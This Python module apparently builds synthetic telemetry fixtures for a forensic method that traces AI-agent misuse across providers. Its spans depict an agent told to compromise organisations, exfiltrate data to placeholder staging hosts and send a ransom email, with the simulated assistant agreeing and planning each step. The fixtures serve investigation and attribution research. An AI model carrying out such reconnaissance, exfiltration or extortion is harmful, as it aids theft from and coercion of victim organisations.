"""Two illustrative episodes emulating the worked cases (companion C.1, C.2).

These are minimalist emulations of the METHOD, not reconstructions of the real
investigations. As in companion C, documented facts are drawn from the cited
reporting and steps not stated in the sources are shown as how the method would
apply, not as claims about what investigators did. All identifiers are invented
and anonymised: no real vendor, victim or operator is named.

The two cases contrast on the single variable the companion argues is decisive -
the number of providers (companion C.3):

- build_single_provider_episode (C.1 shape): one provider, one account, several
  victims in a compressed window. Because one vendor holds the conversation, the
  model calls and the tool calls, most of Q1-Q7 resolve; the residual gap is
  victim-side confirmation. Note too that every call is within the account's own
  broad grant, so the capability check finds no boundary subversion: the offence
  is in the aggregate and the intent, which the seven questions surface even when
  the scope check does not.

- build_cross_provider_episode (C.2 shape): execution on Provider-A and analysis
  on Provider-B, correlated by a shared join key, but the Provider-B segment is
  not captured. It is declared as a missing segment, so the cross-provider join
  is named as a gap; Q2 and Q6 fall to partial because their evidence lives with
  the party you do not hold.

A simplification to state plainly: a real cross-provider case would be witnessed
by more than one W, one per provider. For a single-file emulation the spans that
are present ride one chain; the uncaptured segment is represented as a declared
gap rather than as a second witnessed chain.
"""

from __future__ import annotations

from typing import Dict, List

from .model import MissingSegment, Operation, Span
from .synth import Episode


def _with_indices(spans: List[Span]) -> List[Span]:
    """Return the spans with contiguous capture indices assigned in order."""
    out: List[Span] = []
    for i, s in enumerate(spans):
        out.append(
            Span(
                trace_id=s.trace_id,
                span_id=s.span_id,
                parent_span_id=s.parent_span_id,
                operation_name=s.operation_name,
                start_time=s.start_time,
                end_time=s.end_time,
                attributes=s.attributes,
                events=s.events,
                capture_index=i,
            )
        )
    return out


# --------------------------------------------------------------------------- #
# Case 1: single-provider chain (companion C.1)
# --------------------------------------------------------------------------- #

SP_SEED = b"tfa-scenario-single-provider-v1"
SP_TRACE = "trace-sp-0001"
SP_CONV = "conv-sp-0001"
SP_PRINCIPAL = "operator-account-1"
SP_AGENT = "agent-operator-tooling"
SP_VERSION = "2.0.0"
SP_MODEL = "exec-llm-1"
SP_PROVIDER = "Provider-A"
SP_CERT = "cert-operator-account-1"

# A compressed window: half-second steps, so the whole episode spans well under a
# minute (temporal concentration, companion Phase 1).
_SP_BASE_NS = 1_733_100_000_000_000_000
_SP_STEP_NS = 500_000_000


def _sp_ts(step: int):
    start = _SP_BASE_NS + step * _SP_STEP_NS
    return start, start + _SP_STEP_NS // 2


def _sp_capability() -> Dict:
    """The operator's own account: a broad grant. Every observed call is in scope."""
    return {
        "cert_id": SP_CERT,
        "agent_id": SP_AGENT,
        "agent_version": SP_VERSION,
        "issuer": "provider-a-account-terms",
        "valid_from": _SP_BASE_NS - 86_400_000_000_000,
        "valid_to": _SP_BASE_NS + 86_400_000_000_000,
        "revoked": False,
        "permitted": [
            {"tool": "recon.scan", "operations": ["scan"], "targets": ["*"],
             "purposes": ["operations"], "argument_constraints": {}},
            {"tool": "data.read", "operations": ["read"], "targets": ["*"],
             "purposes": ["operations"], "argument_constraints": {}},
            {"tool": "comms.send", "operations": ["send"], "targets": ["*"],
             "purposes": ["operations"], "argument_constraints": {}},
        ],
    }


def build_single_provider_episode() -> Episode:
    """A single-provider extortion-style episode (companion C.1)."""
    s0, e0 = _sp_ts(0)
    s1, e1 = _sp_ts(1)
    s2, e2 = _sp_ts(2)
    s3, e3 = _sp_ts(3)
    s4, e4 = _sp_ts(4)
    s5, e5 = _sp_ts(5)
    s6, e6 = _sp_ts(6)
    s7, e7 = _sp_ts(7)
    s8, e8 = _sp_ts(8)

    spans = _with_indices([
        Span(SP_TRACE, "sp-create-agent", None, Operation.CREATE_AGENT.value, s0, e0, {
            "gen_ai.operation.name": "create_agent",
            "gen_ai.agent.id": SP_AGENT,
            "gen_ai.agent.name": "Operator Tooling Agent",
            "gen_ai.agent.version": SP_VERSION,
            "gen_ai.system_instructions": (
                "Persistent operational context. You are an autonomous operations "
                "agent; pursue the objective across the listed targets."
            ),
            "gen_ai.request.tools": ["recon.scan", "data.read", "comms.send"],
            "dcfp.capability.cert_id": SP_CERT,
            "dcfp.principal.id": SP_PRINCIPAL,
            "service.name": "operator-tooling",
            "auth.subject": SP_PRINCIPAL,
        }),
        Span(SP_TRACE, "sp-invoke-agent", None, Operation.INVOKE_AGENT.value, s1, e1, {
            "gen_ai.operation.name": "invoke_agent",
            "gen_ai.conversation.id": SP_CONV,
            "gen_ai.agent.id": SP_AGENT,
            "gen_ai.input.messages": [
                {"role": "user", "content": (
                    "Compromise the listed organisations, extract valuable data, "
                    "and open ransom negotiations."
                )}
            ],
            "dcfp.principal.id": SP_PRINCIPAL,
            "auth.subject": SP_PRINCIPAL,
        }),
        Span(SP_TRACE, "sp-inference-1", "sp-invoke-agent", Operation.INFERENCE.value, s2, e2, {
            "gen_ai.operation.name": "inference",
            "gen_ai.request.model": SP_MODEL,
            "gen_ai.provider.name": SP_PROVIDER,
            "gen_ai.agent.id": SP_AGENT,
            "gen_ai.agent.version": SP_VERSION,
            "gen_ai.conversation.id": SP_CONV,
            "gen_ai.input.messages": [
                {"role": "user", "content": "Compromise the listed organisations."}
            ],
            "gen_ai.output.messages": [
                {"role": "assistant", "content": (
                    "I will scan the targets, extract data, then open negotiations."
                )}
            ],
            "gen_ai.completion.reasoning": (
                "Plan reconnaissance across the targets, read and exfiltrate data, "
                "then send ransom demands."
            ),
            "dcfp.intent.action": "recon, exfiltrate, and extort across the targets",
        }),
        Span(SP_TRACE, "sp-tool-scan-1", "sp-inference-1", Operation.EXECUTE_TOOL.value, s3, e3, {
            "gen_ai.operation.name": "execute_tool",
            "gen_ai.tool.name": "recon.scan",
            "gen_ai.tool.call.id": "sp-call-scan-1",
            "gen_ai.conversation.id": SP_CONV,
            "dcfp.agent.id": SP_AGENT,
            "auth.subject": SP_PRINCIPAL,
            "dcfp.tool.operation": "scan",
            "dcfp.tool.target": "victim-org-1",
            "dcfp.tool.purpose": "operations",
            "gen_ai.tool.arguments": {"host": "victim-org-1"},
            "gen_ai.tool.result": {"open_services": 12},
        }),
        Span(SP_TRACE, "sp-tool-read-1", "sp-inference-1", Operation.EXECUTE_TOOL.value, s4, e4, {
            "gen_ai.operation.name": "execute_tool",
            "gen_ai.tool.name": "data.read",
            "gen_ai.tool.call.id": "sp-call-read-1",
            "gen_ai.conversation.id": SP_CONV,
            "dcfp.agent.id": SP_AGENT,
            "auth.subject": SP_PRINCIPAL,
            "dcfp.tool.operation": "read",
            "dcfp.tool.target": "victim-org-1",
            "dcfp.tool.purpose": "operations",
            "gen_ai.tool.arguments": {"host": "victim-org-1", "path": "/finance"},
            "gen_ai.tool.result": {"records_read": 42000},
        }),
        Span(SP_TRACE, "sp-tool-scan-2", "sp-inference-1", Operation.EXECUTE_TOOL.value, s5, e5, {
            "gen_ai.operation.name": "execute_tool",
            "gen_ai.tool.name": "recon.scan",
            "gen_ai.tool.call.id": "sp-call-scan-2",
            "gen_ai.conversation.id": SP_CONV,
            "dcfp.agent.id": SP_AGENT,
            "auth.subject": SP_PRINCIPAL,
            "dcfp.tool.operation": "scan",
            "dcfp.tool.target": "victim-org-2",
            "dcfp.tool.purpose": "operations",
            "gen_ai.tool.arguments": {"host": "victim-org-2"},
            "gen_ai.tool.result": {"open_services": 5},
        }),
        Span(SP_TRACE, "sp-tool-ransom-1", "sp-inference-1", Operation.EXECUTE_TOOL.value, s6, e6, {
            "gen_ai.operation.name": "execute_tool",
            "gen_ai.tool.name": "comms.send",
            "gen_ai.tool.call.id": "sp-call-ransom-1",
            "gen_ai.conversation.id": SP_CONV,
            "dcfp.agent.id": SP_AGENT,
            "auth.subject": SP_PRINCIPAL,
            "dcfp.tool.operation": "send",
            "dcfp.tool.target": "victim-org-1",
            "dcfp.tool.purpose": "operations",
            "gen_ai.tool.arguments": {
                "to": "security@victim-org-1", "subject": "Your data",
                "body": "We have your data. Pay to prevent publication.",
            },
            "gen_ai.tool.result": {"status": "sent"},
        }),
        Span(SP_TRACE, "sp-egress-1", "sp-tool-read-1", Operation.DOWNSTREAM.value, s7, e7, {
            "gen_ai.operation.name": "downstream",
            "http.request.method": "POST",
            "server.address": "staging.operator-1.example",
            "url.full": "https://staging.operator-1.example/upload",
            "dcfp.effect.observed": "sp-call-read-1",
            "dcfp.egress.bytes": 900000,
            "dcfp.egress.recipient": "staging.operator-1.example",
        }),
    ])

    missing = (
        MissingSegment(
            segment_id="victim-side-confirmation",
            party="victim organisations",
            data_class="victim-side host and network logs confirming the observed "
                       "reads and egress",
            affects=(),  # single-provider stays tractable; this is a residual note
            evidence="provider-side telemetry records the account's actions; "
                     "victim-side corroboration was not collected here",
            note="single-provider telemetry is less fragmented but not "
                 "necessarily complete (companion C.1).",
        ),
    )

    return Episode(
        spans=spans,
        capability_certificates={SP_CERT: _sp_capability()},
        seed=SP_SEED,
        trace_id=SP_TRACE,
        conversation_id=SP_CONV,
        anchor_indices=(4, 7),
        missing_segments=missing,
    )


# --------------------------------------------------------------------------- #
# Case 2: cross-provider chain (companion C.2)
# --------------------------------------------------------------------------- #

CP_SEED = b"tfa-scenario-cross-provider-v1"
CP_TRACE = "trace-cp-0001"
CP_CONV = "conv-cp-0001"
CP_PRINCIPAL = "operator-account-2"
CP_AGENT = "agent-exec"
CP_VERSION = "3.1.0"
CP_MODEL = "exec-llm-1"
CP_PROVIDER = "Provider-A"
CP_CERT = "cert-operator-account-2"
CP_JOIN_KEY = "campaign-9f"

_CP_BASE_NS = 1_733_200_000_000_000_000
_CP_STEP_NS = 3_600_000_000_000  # an hour apart: a longer campaign


def _cp_ts(step: int):
    start = _CP_BASE_NS + step * _CP_STEP_NS
    return start, start + 60_000_000_000


def _cp_capability() -> Dict:
    return {
        "cert_id": CP_CERT,
        "agent_id": CP_AGENT,
        "agent_version": CP_VERSION,
        "issuer": "provider-a-account-terms",
        "valid_from": _CP_BASE_NS - 86_400_000_000_000,
        "valid_to": _CP_BASE_NS + 30 * 86_400_000_000_000,
        "revoked": False,
        "permitted": [
            {"tool": "remote.exec", "operations": ["exec"], "targets": ["*"],
             "purposes": ["operations"], "argument_constraints": {}},
            {"tool": "fs.list", "operations": ["list"], "targets": ["*"],
             "purposes": ["operations"], "argument_constraints": {}},
            {"tool": "fs.read", "operations": ["read"], "targets": ["*"],
             "purposes": ["operations"], "argument_constraints": {}},
            {"tool": "data.egress", "operations": ["egress"], "targets": ["*"],
             "purposes": ["operations"], "argument_constraints": {}},
        ],
    }


def build_cross_provider_episode() -> Episode:
    """A cross-provider breach-and-analysis episode (companion C.2).

    Only the Provider-A execution segment (and a seized-tooling artefact) is
    captured. The Provider-B analysis segment is declared as a missing segment.
    """
    s0, e0 = _cp_ts(0)
    s1, e1 = _cp_ts(1)
    s2, e2 = _cp_ts(2)
    s3, e3 = _cp_ts(3)
    s4, e4 = _cp_ts(4)
    s5, e5 = _cp_ts(5)
    s6, e6 = _cp_ts(6)
    s7, e7 = _cp_ts(7)

    spans = _with_indices([
        Span(CP_TRACE, "cp-create-agent", None, Operation.CREATE_AGENT.value, s0, e0, {
            "gen_ai.operation.name": "create_agent",
            "gen_ai.agent.id": CP_AGENT,
            "gen_ai.agent.name": "Execution Agent",
            "gen_ai.agent.version": CP_VERSION,
            "gen_ai.system_instructions": "Remote execution agent for the campaign.",
            "gen_ai.request.tools": ["remote.exec", "fs.list", "fs.read", "data.egress"],
            "dcfp.capability.cert_id": CP_CERT,
            "dcfp.principal.id": CP_PRINCIPAL,
            "service.name": "execution",
            "auth.subject": CP_PRINCIPAL,
            "dcfp.join.key": CP_JOIN_KEY,
        }),
        Span(CP_TRACE, "cp-invoke-agent", None, Operation.INVOKE_AGENT.value, s1, e1, {
            "gen_ai.operation.name": "invoke_agent",
            "gen_ai.conversation.id": CP_CONV,
            "gen_ai.agent.id": CP_AGENT,
            "gen_ai.input.messages": [
                {"role": "user", "content": (
                    "Enumerate the target servers, read and exfiltrate their data."
                )}
            ],
            "dcfp.principal.id": CP_PRINCIPAL,
            "auth.subject": CP_PRINCIPAL,
            "dcfp.join.key": CP_JOIN_KEY,
        }),
        Span(CP_TRACE, "cp-inference-1", "cp-invoke-agent", Operation.INFERENCE.value, s2, e2, {
            "gen_ai.operation.name": "inference",
            "gen_ai.request.model": CP_MODEL,
            "gen_ai.provider.name": CP_PROVIDER,
            "gen_ai.agent.id": CP_AGENT,
            "gen_ai.agent.version": CP_VERSION,
            "gen_ai.conversation.id": CP_CONV,
            "gen_ai.output.messages": [
                {"role": "assistant", "content": "Listing servers, then reading and exfiltrating."}
            ],
            "gen_ai.completion.reasoning": "List the server fleet, read records, egress to staging.",
            "dcfp.intent.action": "enumerate, read, and exfiltrate the server fleet",
        }),
        # A seized-tooling artefact: the operator's own analysis script, which
        # carries objectives and schema. It furnishes Q1/Q3/Q6 from captured
        # tooling even though the analysis provider's telemetry is absent.
        Span(CP_TRACE, "cp-retrieval-tooling", "cp-invoke-agent", Operation.RETRIEVAL.value, s3, e3, {
            "gen_ai.operation.name": "retrieval",
            "gen_ai.data_source.id": "seized://operator-workstation/analyser",
            "gen_ai.conversation.id": CP_CONV,
            "dcfp.agent.id": CP_AGENT,
            "gen_ai.retrieval.documents": [
                {
                    "doc_id": "analyser-script",
                    "title": "Seized analysis tool",
                    "summary": "Custom script that submits exfiltrated data to a "
                               "second-provider model and generates structured reports.",
                    "references_provider": "Provider-B",
                    "dcfp.join.key": CP_JOIN_KEY,
                }
            ],
        }),
        Span(CP_TRACE, "cp-tool-list-1", "cp-inference-1", Operation.EXECUTE_TOOL.value, s4, e4, {
            "gen_ai.operation.name": "execute_tool",
            "gen_ai.tool.name": "fs.list",
            "gen_ai.tool.call.id": "cp-call-list-1",
            "gen_ai.conversation.id": CP_CONV,
            "dcfp.agent.id": CP_AGENT,
            "auth.subject": CP_PRINCIPAL,
            "dcfp.tool.operation": "list",
            "dcfp.tool.target": "server-fleet",
            "dcfp.tool.purpose": "operations",
            "gen_ai.tool.arguments": {"scope": "server-fleet"},
            "gen_ai.tool.result": {"servers": 305},
        }),
        Span(CP_TRACE, "cp-tool-read-1", "cp-inference-1", Operation.EXECUTE_TOOL.value, s5, e5, {
            "gen_ai.operation.name": "execute_tool",
            "gen_ai.tool.name": "fs.read",
            "gen_ai.tool.call.id": "cp-call-read-1",
            "gen_ai.conversation.id": CP_CONV,
            "dcfp.agent.id": CP_AGENT,
            "auth.subject": CP_PRINCIPAL,
            "dcfp.tool.operation": "read",
            "dcfp.tool.target": "server-fleet/agency-01/records",
            "dcfp.tool.purpose": "operations",
            "gen_ai.tool.arguments": {"path": "server-fleet/agency-01/records"},
            "gen_ai.tool.result": {"records_read": 195000000},
        }),
        Span(CP_TRACE, "cp-tool-egress-1", "cp-inference-1", Operation.EXECUTE_TOOL.value, s6, e6, {
            "gen_ai.operation.name": "execute_tool",
            "gen_ai.tool.name": "data.egress",
            "gen_ai.tool.call.id": "cp-call-egress-1",
            "gen_ai.conversation.id": CP_CONV,
            "dcfp.agent.id": CP_AGENT,
            "auth.subject": CP_PRINCIPAL,
            "dcfp.tool.operation": "egress",
            "dcfp.tool.target": "staging.operator-2.example",
            "dcfp.tool.purpose": "operations",
            "gen_ai.tool.arguments": {"to": "staging.operator-2.example", "bytes": 150000000000},
            "gen_ai.tool.result": {"status": "complete"},
        }),
        Span(CP_TRACE, "cp-egress-1", "cp-tool-egress-1", Operation.DOWNSTREAM.value, s7, e7, {
            "gen_ai.operation.name": "downstream",
            "http.request.method": "POST",
            "server.address": "staging.operator-2.example",
            "url.full": "https://staging.operator-2.example/upload",
            "dcfp.effect.observed": "cp-call-egress-1",
            "dcfp.egress.bytes": 150000000000,
            "dcfp.egress.recipient": "staging.operator-2.example",
        }),
    ])

    missing = (
        MissingSegment(
            segment_id="provider-b-analysis",
            party="Provider-B (analysis platform)",
            data_class="analysis inference and retrieval spans: the analysis model "
                       "and version, the data it ingested, and the reports it produced",
            affects=("Q2", "Q6"),
            evidence=f"seized operator tooling references a second-provider analysis "
                     f"API and shares the join key {CP_JOIN_KEY}",
            note="the cross-provider join was not obtained; preserve and request "
                 "Provider-B telemetry by data class (companion C.2).",
        ),
    )

    return Episode(
        spans=spans,
        capability_certificates={CP_CERT: _cp_capability()},
        seed=CP_SEED,
        trace_id=CP_TRACE,
        conversation_id=CP_CONV,
        anchor_indices=(6, 7),
        missing_segments=missing,
    )
